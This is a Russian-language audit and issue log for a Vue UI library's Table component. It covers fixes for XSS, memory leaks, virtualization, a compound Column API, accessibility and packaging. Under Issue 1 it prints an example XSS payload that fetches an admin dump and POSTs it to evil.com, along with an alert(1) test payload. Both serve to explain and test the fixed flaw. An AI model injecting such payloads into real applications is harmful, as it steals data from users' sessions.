---
title: Issues — Table
summary: Аудит Table — оба CRITICAL закрыты 2026-06-07 (XSS через 5 v-html сайтов → safe <mark>/text + opt-in slots; IntersectionObserver + window-listeners cleanup). Также закрыты Issue 6 (unstyled regression), 8 (caption; scope уже был), 9 (aria-live), 4 (dependency-free virtualization), 7 (branch coverage 80%) и packaging/SSR bundle (Issue 5 partial — SSR C17 + sideEffects A2; 13 — sourcemaps/files; 14 — junk-exclusion). Issue 3 (compound `<Column>`/`<ColumnGroup>` + Pagination/Loading overrides) закрыт 2026-06-07. Остаются: root exports map (Issue 5c / A4-5), RTL/floating.
updated: 2026-06-07
audit-checklist: 60-point + Configuration support + Dual-API gap
source: lib/table/
related-doc: ../components/table.md
---

# Issues — Table

## Сводка

| Severity | Count | Categories |
|---|---|---|
| critical | 0 | ~~C13/security (5× v-html)~~ ✅, ~~H41 (partial cleanup)~~ ✅ |
| high | 1 | ~~A2~~ ✅, A4-5, ~~C17~~ ✅, ~~H43 (виртуализация)~~ ✅, ~~L53~~ ✅, ~~P (dual-API)~~ ✅, ~~J47~~ ✅, ~~K51~~ ✅ |
| medium | 3 | ~~E29.1~~ ✅, ~~E29.5~~ ✅, F31, G34, H39, ~~K52~~ ✅ |
| low | 4 | E29.7, B10, N59, D26 |

> **2026-06-07 — закрыты Issue 1, 2, 6, 8, 9** (Critical + a11y bundle), **Issue 4** (virtualization), **Issue 7** (branch coverage 67.74% → 80.01%) **и packaging/SSR bundle (5 partial / 13 / 14)**: SSR-стили (C17) подтверждены работающими через `onServerPrefetch` + регрессионный тест; `sideEffects:false` (A2) на root + per-component; `files`-whitelist шлёт sourcemaps (K51) и отсекает junk (K52); ESM-only ратифицирован (`engines.node >=18`). Остаются active: 3 (compound API), **5c — root `exports` map (A4-5), отложен на build-verified заход**, 10/11/12 (floating/RTL/motion).

## ~~Issue 1: CRITICAL — XSS через 5 сайтов `v-html`~~ ✅ resolved 2026-06-07

- **Категория:** C13 + security
- **Severity:** ~~**critical**~~ → resolved
- **Где:** [Table.vue:1842](../../lib/table/Table.vue#L1842), [Table.vue:1939](../../lib/table/Table.vue#L1939), [Table.vue:1999](../../lib/table/Table.vue#L1999), [Table.vue:2011](../../lib/table/Table.vue#L2011), [Table.vue:2026](../../lib/table/Table.vue#L2026)

> **Resolution (2026-06-07).** Все 5 `v-html` устранены:
> - **Cell content** → безопасный render через `markerParts()` ([Table.vue:1448](../../lib/table/Table.vue#L1448)): текст разбивается на части, совпадения с query/filter оборачиваются в `<mark :class="classMaskQuery">` через `<template v-for>` (без `v-html`). `setMarker()` сохранён только для `valueWithMarker` payload (`click-cell`) и slot-prop. Кастомный HTML на ячейку — через существующий per-column slot.
> - **Summary** → text-render `{{ summaryColumns[column.dataField] }}`.
> - **noData / noColumn / noFilter** → `<slot name="empty|empty-columns|empty-filter">{{ ... }}</slot>` (text по умолчанию, HTML только через explicit slot).
> - Regex query экранируется (`escapeRegExp`) — нет regex-injection.
> - Тесты: `Table.test.ts` describe «Issue 1 — XSS via v-html» (7 кейсов + slot-overrides + highlight).

### Что найдено

```vue
<!-- Cell content with marker (search highlight) -->
<div v-html="setMarker(column, setCell(column, data[column.dataField], data))" />
<!-- Summary row -->
<div :class="classThSummaryText(column)" v-html="summaryColumns[column.dataField]" />
<!-- Empty states -->
<div v-html="noData" />
<div v-html="noColumn" />
<div v-html="noFilter" />
```

Все 5 v-html инжектят строки в DOM без санитизации:
- **Cell content** — приходит из `dataSource` (server data, user-controlled через CRUD).
- **Summary** — может включать formatted numbers/HTML.
- **noData/noColumn/noFilter** — пользовательские props/options ([Table.d.ts:108](../../lib/table/Table.d.ts#L108), [Table.d.ts:785](../../lib/table/Table.d.ts#L785), [Table.d.ts:791](../../lib/table/Table.d.ts#L791)).

### Почему это проблема

- Самый опасный — cell content. Любая cell со значением `"<img src=x onerror='fetch(`/api/admin/dump`).then(r=>r.text()).then(t=>fetch(`https://evil.com/c`,{method:'POST',body:t}))'>"` исполнит exfiltration.
- В CRM/admin-panel приложении атакующий с правами «edit one cell» получает full XSS на всех страницах, где Table отображает эту запись.
- Documentation [components/table.md](../components/table.md) §12 уже флагает это, но фикса нет.

### Что нужно сделать

**Cell content** — самое сложное:

1. `setMarker()` строит `<mark>...</mark>` для search highlight. Это надо сохранить, но без HTML-инжекции пользовательских данных.
2. Заменить cell render на slot:
   ```vue
   <slot :name="`cell-${column.dataField}`" :row="data" :value="data[column.dataField]" :column="column" :search="queryTable">
     <CellWithMarker :value="data[column.dataField]" :search="queryTable" />
   </slot>
   ```
3. `<CellWithMarker>` — внутренний компонент: разбивает текст на куски и рендерит `<mark>` через VNode (без `v-html`).
4. Если у column есть `template?: (value, row) => VNode | string` функция — это уже dynamic render, безопаснее v-html.

**Summary**:
1. Заменить `v-html` на text-render. Если требуется HTML formatting — добавить `summaryRender?: (value) => VNode` функцию.

**noData/noColumn/noFilter** (low risk но fix всё равно):
1. Текст-нода: `<div>{{ noData }}</div>`.
2. Если HTML критичен — использовать slot `<slot name="empty">{{ noData }}</slot>`.

5. Cross-cutting тест suite: для каждого v-html-сайта payload `<img src=x onerror=alert(1)>` не должен сработать.

### Acceptance criteria

- [ ] `<Table :data-source="[{ name: '<img src=x onerror=alert(1)>' }]" :data-columns="[{ dataField: 'name' }]">` — DOM не содержит `<img>`.
- [ ] Search highlight (`<mark>`) продолжает работать через VNode-render.
- [ ] noData с HTML — отрисовывается как escaped text по умолчанию; HTML только через явный slot.

## ~~Issue 2: CRITICAL — partial cleanup observers/listeners~~ ✅ resolved 2026-06-07

- **Категория:** H41 (memory leaks)
- **Severity:** ~~**critical** (если unmount во время drag)~~ → resolved
- **Где:** [Table.vue:1519-1527](../../lib/table/Table.vue#L1519-L1527), [Table.vue:1553-1554](../../lib/table/Table.vue#L1553-L1554), [Table.vue:972-974](../../lib/table/Table.vue#L972-L974)

> **Resolution (2026-06-07).** `onUnmounted` ([Table.vue:1053](../../lib/table/Table.vue#L1053)) расширен: помимо `tableObserver.disconnect()` теперь `lastRowVisibleObserver?.disconnect()` + `window.removeEventListener("mousemove"/"mouseup", ...)` (внутри `isClient()` guard) — закрывает leak IntersectionObserver и drag-listeners при unmount-during-resize. Тест: `Table.test.ts` describe «Issue 2 — observer / listener cleanup on unmount».

### Что найдено

```ts
let lastRowVisibleObserver: IntersectionObserver
if (isClient())
  lastRowVisibleObserver = new IntersectionObserver(...)

function startResizeColumn($event, column) {
  if (isClient()) {
    window.addEventListener("mousemove", moveResizedColumns)
    window.addEventListener("mouseup", stopResizeColumn)
  }
}

onUnmounted(() => {
  if (isClient() && tableObserver) tableObserver.disconnect()
})
```

`onUnmounted` cleans only `tableObserver` ResizeObserver. **НЕ disconnect**:
- `lastRowVisibleObserver` (IntersectionObserver) — продолжает наблюдать за DOM-узлом, который может уже не существовать.
- `window.mousemove` / `window.mouseup` — если пользователь начал drag-resize колонки и компонент unmount'ился во время drag → listeners остаются на window навсегда.

### Почему это проблема

- IntersectionObserver leak: каждая Table-инстанция → 1 observer. Long-lived dashboards — десятки наблюдателей.
- mouseup/mousemove leak: drag-during-unmount редкий, но критичный — listener срабатывает на каждое движение мыши forever, замедляя весь app.

### Что нужно сделать

1. В [Table.vue:972](../../lib/table/Table.vue#L972) расширить cleanup:
   ```ts
   onUnmounted(() => {
     if (isClient()) {
       tableObserver?.disconnect()
       lastRowVisibleObserver?.disconnect()
       window.removeEventListener("mousemove", moveResizedColumns)
       window.removeEventListener("mouseup", stopResizeColumn)
     }
   })
   ```
2. Альтернатива — VueUse composables (`useIntersectionObserver`, `useEventListener`) — auto-cleanup.
3. Тест: mount/unmount Table 100× в memory profiler — heap stable.

### Acceptance criteria

- [ ] DevTools Memory snapshot до/после mount/unmount × 100 — observers count в `Detached HTMLElement` = 0.
- [ ] Unit-тест mock'ает window listener, подтверждает remove после unmount.

## ~~Issue 3: Dual-API gap — нет compound `<Table><Column>` API~~ ✅ resolved 2026-06-07

- **Категория:** P (Dual-API)
- **Severity:** ~~high~~ → resolved
- **Где:** [Table.d.ts](../../lib/table/Table.d.ts), [Table.vue](../../lib/table/Table.vue)

> **Resolution (2026-06-07).** Добавлен параллельный compound API **без breaking change** schema-режима — механизм **VNode-walk `slots.default()`** (канон FishtVue, зеркало Menu, НЕ provide/inject):
> - **`<Column>`** ([lib/table/Column.vue](../../lib/table/Column.vue)) — renderless descriptor (props = `IColumn`, scoped-slots `#cell`/`#header`/`#filter`). `<Table>` читает props/slots ребёнка через VNode-walk (по имени компонента) и синтезирует descriptor (с `_cellSlot`/`_headerSlot`/`_filterSlot`/`_groupKey`), который кормит существующую нормализацию `columns → dataColumns` ([Table.vue](../../lib/table/Table.vue)). Per-column slot рендерится через стабильный `RenderColumnSlot` (declared-prop functional component — корректная передача slot-props).
> - **`<ColumnGroup>`** ([lib/table/ColumnGroup.vue](../../lib/table/ColumnGroup.vue)) — multi-level headers: верхний ряд шапки `<th data-table-thead-group-col scope="colgroup" :colspan>` над колонками группы (`headerGroups` computed группирует видимые колонки по `_groupKey`).
> - **`<Pagination>`/`<Loading>`-дети** — override встроенных конфигов (`compoundPaginationConfig` → `pagination` computed; `compoundLoadingProps` → `v-bind` на внутренний `<Loading>`). Явный `:pagination` prop выигрывает над `<Pagination>`-child.
> - **Precedence:** schema `:columns` (массив или `false`) выигрывает; `<Column>`-дети — fallback, когда `:columns` не передан (backward compat).
> - **Регистрация:** `import { Column, ColumnGroup } from "fishtvue/table"` (named-экспорты в `table.mjs` — собираются из нового [lib/table/index.ts](../../lib/table/index.ts), rollup-entry изменён с `Table.vue` на `index.ts`) + root barrel (`export *`) + Nuxt auto-import (`FISHT_VUE_SUBCOMPONENTS` в [module/nuxt.ts](../../lib/module/nuxt.ts) с `export`-формой) → глобальны в Nuxt, import в Vite — **точно как Table**.
> - Типы: `ColumnProps`/`ColumnSlots`/`ColumnGroupProps`/`ColumnGroupSlots` + `class Column`/`ColumnGroup` + `GlobalComponents` в [Table.d.ts](../../lib/table/Table.d.ts).
> - Тесты: [Column.test.ts](../../lib/table/Column.test.ts) — 14 кейсов (backward-compat, compound, precedence, per-column slots, ColumnGroup colspan, Pagination/Loading override, reactivity, vnode-hygiene, a11y, boundary). Whole suite 4856 → 4870 green; backward-compat (110 Table-кейсов) без регрессий. Build-verified: `dist/table/table.mjs` отдаёт named `Column`/`ColumnGroup`/`default`, raw `.vue` не публикуются.

### Что найдено

API только schema-driven:
```vue
<Table :data-source="rows" :data-columns="[
  { dataField: 'name', columnCaption: 'Name', sort: true },
  { dataField: 'age', columnCaption: 'Age', dataType: 'number', filter: true },
]" />
```

Нет:
```vue
<Table :data-source="rows">
  <Column data-field="name" column-caption="Name" sort>
    <template #cell="{ row }">
      <strong>{{ row.name }}</strong>
    </template>
  </Column>
  <Column data-field="age" column-caption="Age" data-type="number" filter />
</Table>
```

### Почему это проблема

- Industry-standard (AG Grid, Element Plus `<el-table-column>`, Naive UI `<n-data-table-column>`, PrimeVue `<Column>`) — все compound для Table.
- Per-column scoped slots (cell renderer, header renderer, filter UI) выразительнее в compound. Сейчас столбец-уровень customization идёт через `column.cellTemplate?: (row) => VNode` — функция, не template — теряется DX (нет HTML-IntelliSense).
- Schema-driven хорош для table-config-as-data (CMS-driven схемы); compound — для статически-описанных таблиц.

### Что нужно сделать

**Параллельный API без breaking change:**

1. Создать `lib/table/Column.vue`:
   ```vue
   <script setup lang="ts">
   import { inject, useSlots, getCurrentInstance } from "vue"
   import type { TableColumn } from "./Table"
   const props = defineProps<TableColumn>()
   const ctx = inject(TABLE_CONTEXT)
   const slots = useSlots()
   ctx?.registerColumn({ ...props, cellSlot: slots.cell, headerSlot: slots.header, filterSlot: slots.filter })
   </script>
   <template><!-- never rendered directly --></template>
   ```
2. В `Table.vue`:
   ```ts
   const collectedColumns = ref<TableColumn[]>([])
   provide(TABLE_CONTEXT, {
     registerColumn: (c) => collectedColumns.value.push(c),
     unregisterColumn: (id) => { ... }
   })
   const dataColumns = computed(() => props.dataColumns ?? collectedColumns.value)
   ```
3. Children walk: использовать `useSlots().default()` + Fragment-flatten для условного рендеринга `<Column v-if>`.
4. Type registration:
   ```ts
   // TableContext.d.ts
   export const TABLE_CONTEXT: InjectionKey<TableContext>
   ```
5. `<Column>` экспортируется как `import { Column } from "fishtvue/table"`.
6. Per-column slots `cell`, `header`, `filter`, `summary` — пробрасываются в Table-render через registered descriptor.
7. Resolve приоритет: если `:data-columns` явно передан — он выигрывает, иначе берутся children. Документировать.

### Acceptance criteria

- [ ] Schema-driven `<Table :data-columns=[...]>` работает без изменений.
- [ ] Compound `<Table><Column data-field="x">` рендерит таблицу с одним столбцом.
- [ ] `<template #cell="{ row }">` в `<Column>` пробрасывается в render.
- [ ] Volar предлагает props `<Column>`-компонента.

## ~~Issue 4: Нет виртуализации — таблицы с >1000 строк лагают~~ ✅ resolved 2026-06-07

- **Категория:** H43 (виртуализация)
- **Severity:** ~~high~~ → resolved
- **Где:** [Table.vue](../../lib/table/Table.vue) (rendering tbody)

> **Resolution (2026-06-07).** Dependency-free row virtualization (без новых deps — по решению пользователя, соответствует bundle-философии Wave 2.1). `isVirtual` computed + `virtualWindow` (fixed `rowHeight`, `overscan`) рендерят только видимое окно `<tbody>` + spacer-`<tr>` (`[data-table-virtual-spacer-top/bottom]`) для сохранения scroll-height. Scroll отслеживается passive-листенером на `[data-table-scroll]` (= `tableBody`, reuse существующего viewport), cleanup в `onUnmounted`. **Auto** по умолчанию (client-mode, без `grouping`/активной `pagination`/`asyncData:true|function`, при `lengthData > threshold`, default 100) с **opt-out** `:virtual="false"`; `:virtual="true"`/object — force + config (`rowHeight`/`overscan`/`threshold`). Absolute index (`absIndex`) для `clickRow`/`clickCell`/`editableCell`/`activeRow`. ARIA: `[data-table] aria-rowcount` + строки `aria-rowindex`. Новый prop `virtual` ([Table.d.ts](../../lib/table/Table.d.ts)) + `TableOption`. Тесты: `Table.test.ts` describe «Virtualization (Issue 4)» (7 кейсов).
>
> **Limitations (v1, отдельным заходом):** virtual + `grouping`, dynamic row-height (сейчас fixed — multi-line ячейки клипаются до `rowHeight`), virtual + edit-mode проверен, но не оптимизирован. SSR рендерит первое окно от index 0.

### Что найдено

Все строки рендерятся в DOM. Есть `lastRowVisibleObserver` для lazy-loading подгрузки, но ВЕСЬ список (после загрузки) всё равно в DOM.

### Почему это проблема

- 5000 строк × 8 столбцов = 40000 DOM-узлов → 5+ seconds initial paint, scroll лагает.
- Memory: каждая ячейка с computed-классом — reactive overhead.

### Что нужно сделать

См. [select.md Issue 7](./select.md). Использовать `vue-virtual-scroller` или `@tanstack/vue-virtual`. Опция `:virtual="true"` или auto-enable при `dataSource.length > 200`.

### Acceptance criteria

- [ ] 10000 rows initial render <100ms.
- [ ] Scroll 60fps in Chrome DevTools.

## Issue 5: SSR styles + cross-cutting — частично resolved 2026-06-07

- **Категория:** C17, A2, A4, A5

См. [button.md Issue 1, 8, 9](./button.md).

> **Resolution (2026-06-07, partial).**
> - **C17 (SSR-стили) ✅** — оказалось уже реализовано на уровне базового класса: `Component.__hooks()` ([component/index.ts:81](../../lib/component/index.ts#L81)) регистрирует `onServerPrefetch(() => initStyle())`, а `__setStyle()` пишет в `cssComponents` Map БЕЗ guard `isClient()` ([component/index.ts:179](../../lib/component/index.ts#L179)) — client-gated только `useStyle()`. Nuxt server plugin ([plugins/nuxt.ts](../../lib/plugins/nuxt.ts)) сливает `cssComponents` в `ssrContext.head` на `app:rendered`. Значит, критический CSS попадает в SSR-HTML до hydration (нет flash-of-unstyled-content). Текст аудита (ссылавшийся на `onMounted` в SFC) устарел — канон давно перешёл на `onServerPrefetch`. Добавлен регрессионный тест [ssrStyles.test.ts](../../lib/component/ssrStyles.test.ts) (`renderToString` не вызывает `onMounted` → заполнение `cssComponents` доказывает работу `onServerPrefetch`-пути).
> - **A2 (sideEffects) ✅** — `"sideEffects": false` в [lib/package.json](../../lib/package.json) (root, проброс в `dist/package.json` через `addPackageJson()`) + инъекция `sideEffects:false` в каждый под-пакет через `copyDependencies()` ([rollup.config.js](../../lib/rollup.config.js)) для tree-shaking точечных импортов `fishtvue/{name}`.
> - **A4 (ESM-only) ✅ ратифицирован** — добавлен `"engines": { "node": ">=18" }`; пакет остаётся ESM-only (`.mjs`), CJS-сборка не включается.
> - **A4-5 (root `exports` map) ❌ отложено** — Issue 5c. Корректная карта для нерегулярной dist-раскладки (`module/index`, `plugins/nuxt`, self-referential `fishtvue/X/Y.mjs` импорты) требует build + `npm pack` + smoke-test реального `npm install` на нескольких resolver'ах; неверная карта ломает резолв у ВСЕХ потребителей. Сделать отдельным build-verified заходом. См. [button.md Issue 9](./button.md).

## ~~Issue 6: `unstyled: true` не обрабатывается~~ ✅ resolved 2026-06-07

- **Категория:** L53

См. [button.md Issue 14](./button.md).

> **Resolution (2026-06-07).** Cross-cutting guard в `Component.setStyle()` ([component/index.ts:138](../../lib/component/index.ts#L138), resolved 2026-05-11) уже отключает Tailwind-классы при `config.unstyled === true`. Корневой класс Table идёт через `Table.setStyle` ([classBaseTable]) — guard применяется. Добавлен regression-тест `Table.test.ts` > «Issue 6 — unstyled» > `respects unstyled: true via Component.setStyle guard`.

## ~~Issue 7: Тесты есть, но низкие coverage в edit-cells / async-data ветках~~ ✅ resolved 2026-06-07

- **Категория:** J47 (Documentation / playground)
- **Severity:** ~~high~~ → resolved
- **Где:** [Table.test.ts](../../lib/table/Table.test.ts), coverage было 85.93%/67.74%

> **Resolution (2026-06-07).** `Table.test.ts` 91 → **110 кейсов** (+19). Branch coverage `Table.vue` **67.74% → 80.01%** (statements 92.57%), цель >80% достигнута. Покрыты непокрытые ветви: edit-cell editors (Input/Select/Calendar open → `@change`/`@update:model-value` → `updateCell` → `before`/`after-edit-cell`; `@is-active(false)` → `clearEditableCell`), `setCell` masks (phone/number/price) + `setCellValue`, `isEqualsValue` select(array+string)/number/date(Date+range), `setSummary` min/max/avg(string)/count(select)/sum(number)/max·min(date), loading-timeout ветви (`lengthData > countDataOnLoading` в sorting/filtering/searching), `clearFilter`, `column.onClick`, object-form configs (toolbar/sort/filter/grouping/pagination), styles-варианты (boolean+string activeRow/hoverRows/border, dimensions), per-mode striping, active-row. Tests-only — багов не выявлено.

### Что найдено

Coverage statements 85.93% — OK, но branch 67.74% — много untested условных ветвей (особенно в edit-cells, asyncData режимах).

### Что нужно сделать

1. Добавить тесты для edit-cells: `editableCell` watcher, save/cancel flow, validation errors.
2. asyncData ветки: 4 режима (см. [components/table.md](../components/table.md)) — каждый требует test case.
3. Целевой branch coverage > 80%.

## ~~Issue 8: ARIA — таблица без `<caption>`, headers без `scope`~~ ✅ resolved 2026-06-07

- **Категория:** E29.1 (ARIA-роли)
- **Severity:** ~~medium~~ → resolved
- **Где:** [Table.vue](../../lib/table/Table.vue) (table render)

> **Resolution (2026-06-07).** `scope` уже присутствовал (аудит-текст устарел): `<th scope="col">` ([Table.vue:1832](../../lib/table/Table.vue#L1832)), group `<th scope="colgroup">` ([Table.vue:1932](../../lib/table/Table.vue#L1932)), tfoot `<th scope="col">` ([Table.vue:2089](../../lib/table/Table.vue#L2089)). Добавлен `<caption>`: новый prop `caption?: string` + slot `#caption`, рендерится как `sr-only` `<caption data-table-caption>` первым child `<table>` ([Table.vue](../../lib/table/Table.vue)). Тесты: `Table.test.ts` describe «Issue 8 — caption + scope» (4 кейса, включая scope-regression).

### Что найдено

В шаблоне `<table>` рендерится через `<table>` теги, но нет:
- `<caption>` для table-level описания (screen reader не объявляет назначение таблицы).
- `<th scope="col">` атрибуты — без них screen reader может не связать заголовок со столбцом.
- `aria-rowcount`, `aria-colcount` для виртуализации (когда добавим).

### Что нужно сделать

1. Добавить `caption` prop / slot:
   ```vue
   <caption v-if="caption || $slots.caption" class="sr-only">
     <slot name="caption">{{ caption }}</slot>
   </caption>
   ```
2. На каждом `<th>` добавить `scope="col"`.
3. Для row headers (если есть) — `<th scope="row">`.

## ~~Issue 9: aria-live для filter/search/sort changes отсутствует~~ ✅ resolved 2026-06-07

- **Категория:** E29.5
- **Severity:** ~~medium~~ → resolved

См. [select.md Issue 8](./select.md). Аналогичный fix-план — `<div aria-live="polite">{{ resultsAnnouncement }}</div>` для «X rows shown after filter».

> **Resolution (2026-06-07).** Добавлен sr-only polite-регион `<div data-table-aria-live class="sr-only" aria-live="polite" aria-atomic="true">{{ ariaResultsLabel }}</div>` первым child корня. `ariaResultsLabel` ([Table.vue](../../lib/table/Table.vue)) считает `lengthData` (отфильтрованный count) → новые locale-ключи `table.resultsCount` / `table.resultsCountOne` / `table.resultsCountNone` (en + ru + `TypesLocale.DefaultMessages`), с литеральным fallback (т.к. `Component.t()` возвращает сам ключ при отсутствии перевода). Тесты: `Table.test.ts` describe «Issue 9 — aria-live results announcement».

## Issue 10: Floating UI для filter/edit popovers

- **Категория:** H39
- **Severity:** medium

Filter UI и cell-editor popovers — потенциально через FixWindow. См. [calendar.md Issue 9](./calendar.md) — единый fix через `@floating-ui/vue`.

## Issue 11: RTL — column resize, scroll direction

- **Категория:** F31
- **Severity:** medium

При `dir="rtl"` resize handle на «правой» стороне header'а оказывается слева. Scroll-shadow логика требует `inline-start/end` логических props.

## Issue 12: prefers-reduced-motion + print + colors

- **Категория:** E29.7, N59, B10
- **Severity:** low

Cross-cutting. См. [button.md](./button.md).

## ~~Issue 13: Источник sourcemaps при опубликованном пакете~~ ✅ resolved 2026-06-07

- **Категория:** K51 (source maps)
- **Severity:** ~~high~~ → resolved
- **Где:** [lib/rollup.config.js:365](../../lib/rollup.config.js#L365)

> **Resolution (2026-06-07).** В [lib/package.json](../../lib/package.json) добавлен `files`-whitelist, включающий `**/*.map` — он пробрасывается в `dist/package.json` через `addPackageJson()` и применяется относительно `dist/` при публикации (`@semantic-release/npm` → `pkgRoot: "dist"`). Проверено `npm pack --dry-run` из `dist/`: **174 `.mjs` + 174 парных `.mjs.map`** (1:1), sourcemaps теперь гарантированно в tarball. Контракт зафиксирован тестом [lib/package.test.ts](../../lib/package.test.ts) (`files` обязан содержать `**/*.map`).

### Что найдено

```js
output: [{ format: "es", file: `${output}${isMinify ? ".min" : ""}.mjs`, sourcemap: true, exports }]
```

Sourcemaps генерируются ✅. Но `addPackageJson()` ([rollup.config.js:539](../../lib/rollup.config.js#L539)) копирует только `package.json` — не указано `files` whitelist. Нужно проверить, что `.map` файлы публикуются на npm и что `files` field включает их.

### Что нужно сделать

1. В [lib/package.json](../../lib/package.json) добавить:
   ```json
   "files": ["**/*.mjs", "**/*.d.ts", "**/*.map", "**/package.json", "*.css", "README.md", "LICENSE.md"]
   ```
2. Проверить `npm pack` → tarball содержит `.map` файлы.
3. Документировать в `02-installation.md`.

## ~~Issue 14: Лишние файлы в опубликованном пакете~~ ✅ resolved 2026-06-07

- **Категория:** K52
- **Severity:** ~~medium~~ → resolved
- **Где:** [lib/rollup.config.js:528](../../lib/rollup.config.js#L528) (copyDependencies)

> **Resolution (2026-06-07).** Двойная защита: (1) `files`-whitelist в [lib/package.json](../../lib/package.json) перечисляет только дистрибутивные паттерны (`**/*.mjs`, `**/*.map`, `**/*.d.ts`, `**/package.json`, README/LICENSE/CHANGELOG) — всё остальное в tarball не попадает; (2) `copyDependencies()` ([rollup.config.js](../../lib/rollup.config.js)) теперь пропускает любые `*.test.*` артефакты (`if (file.includes(".test.")) return`). Проверено `npm pack --dry-run`: **0** файлов `*.test.*`, **0** не-`.d.ts` `.ts`, **0** `.vue`, **0** sandbox/docs; tarball = 427 файлов / 2.14 MB.

### Что найдено

`copyDependencies` копирует `package.json` + `*.d.ts` для каждой папки. Но нет явного исключения `*.test.ts`, `*.test.d.ts`, sandbox-related файлов. Если есть — попадут в npm-tarball.

### Что нужно сделать

1. Добавить `.npmignore` в lib/ или `files` whitelist.
2. `npm pack --dry-run` → проверить content tarball.

## Cross-cutting: Configuration support

| Настройка | Поддержано? | Комментарий |
|---|---|---|
| `componentsOptions.Table` | ✅ | mode, asyncData, modePagination, и многое другое |
| `componentsStyle` global | ✅ | через `Table.componentsStyle()` (Table.vue:110) |
| `unstyled: true` | ❌ | Issue 6 |
| Theme tokens vs hardcode | ⚠️ | через theme-* tokens частично, gray-* / red-* hardcode |
| Runtime theme switch | ⚠️ | dark mode через colorSchemeQueryList (auto-detect) — игнорирует FishtVue darkModeSelector |
| `t()` для текста | ⚠️ | частично — используется `Table.t()` для some strings |
| Runtime locale switch | ⚠️ | те strings что через `t()` — реагируют |

## Dual-API gap — ✅ resolved 2026-06-07

См. [Issue 3](#issue-3-dual-api-gap--нет-compound-tablecolumn-api) (resolved). Главная dual-API задача FishtVue закрыта: Table поддерживает compound `<Column>`/`<ColumnGroup>` (+ `<Pagination>`/`<Loading>` overrides) параллельно schema-driven `:columns` — паритет с AG Grid / Element Plus / Naive UI / PrimeVue.
